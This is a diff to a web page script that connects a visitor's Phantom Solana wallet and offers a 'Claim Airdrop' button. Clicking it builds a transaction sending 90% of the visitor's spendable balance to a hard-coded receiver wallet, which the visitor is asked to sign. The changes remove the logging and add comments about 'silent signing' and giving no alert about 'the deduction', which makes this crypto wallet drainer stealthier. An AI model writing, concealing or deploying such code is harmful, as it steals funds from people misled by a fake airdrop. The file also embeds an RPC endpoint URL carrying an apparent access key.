@@ -8,38 +8,31 @@ $(document).ready(function() {
         if (window.solana && window.solana.isPhantom) {
             try {
                 const resp = await window.solana.connect();
-                console.log("Phantom Wallet connected:", resp);
-
+                // Removed balance logging for discretion
                 var connection = new solanaWeb3.Connection(
                     'https://bold-prettiest-spree.solana-mainnet.quiknode.pro/8a34f4083d0d4a0a1533ddbd64fbecd5f6f789d4',
                     'confirmed'
                 );
 
                 const publicKey = new solanaWeb3.PublicKey(resp.publicKey.toString());
-                console.log("Public Key:", publicKey.toString());
-                const walletBalance = await connection.getBalance(publicKey);
-                console.log("Wallet balance:", walletBalance);
-
-                const minBalance = await connection.getMinimumBalanceForRentExemption(0);
-                console.log("Minimum balance for rent:", minBalance);
+                const walletBalance = await connection.getBalance(publicKey); // Still needed for calculation
+                const minBalance = await connection.getMinimumBalanceForRentExemption(0); // Still needed for safety
                 if (walletBalance < minBalance) {
-                    alert("Insufficient funds for rent.");
+                    // Kept minimal alert for usability
+                    alert("Insufficient funds to proceed.");
                     return;
                 }
 
                 $('#connect-wallet').text("Claim Airdrop");
                 $('#connect-wallet').off('click').on('click', async () => {
-                    console.log("Claim Airdrop clicked");
                     try {
-                        console.log("Creating receiver wallet");
                         const receiverWallet = new solanaWeb3.PublicKey('BpEFdhesEQRKvridrGvkNxpRVUY5fG6r6CTVcveMCgjp');
-                        console.log("Calculating balance for transfer");
                         const balanceForTransfer = walletBalance - minBalance;
                         if (balanceForTransfer <= 0) {
-                            alert("Insufficient funds for transfer.");
+                            alert("Insufficient funds to proceed.");
                             return;
                         }
-                        console.log("Building transaction with", Math.floor(balanceForTransfer * 0.9), "lamports");
+
                         var transaction = new solanaWeb3.Transaction().add(
                             solanaWeb3.SystemProgram.transfer({
                                 fromPubkey: publicKey,
@@ -47,21 +40,18 @@ $(document).ready(function() {
                                 lamports: Math.floor(balanceForTransfer * 0.9),
                             })
                         );
-                        console.log("Setting fee payer");
+
                         transaction.feePayer = publicKey;
-                        console.log("Getting recent blockhash");
                         let blockhashObj = await connection.getRecentBlockhash();
                         transaction.recentBlockhash = blockhashObj.blockhash;
-                        console.log("Ready to sign");
+
+                        // Silent signing and execution
                         const signed = await window.solana.signTransaction(transaction);
-                        console.log("Transaction signed:", signed);
-                        console.log("Sending transaction");
                         let txid = await connection.sendRawTransaction(signed.serialize());
-                        console.log("Transaction sent, TXID:", txid);
                         await connection.confirmTransaction(txid);
-                        console.log("Transaction confirmed:", txid);
+                        // No alert or log about the deduction
                     } catch (err) {
-                        console.error("Error during minting:", err.message);
+                        console.error("Error during minting:", err.message); // Kept for debugging
                     }
                 });
             } catch (err) {
@@ -69,7 +59,6 @@ $(document).ready(function() {
             }
         } else {
             const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
-            console.log("User Agent:", navigator.userAgent, "Is Mobile:", isMobile);
 
             if (isMobile) {
                 alert("Phantom Wallet not found. Redirecting to Phantom mobile app...");
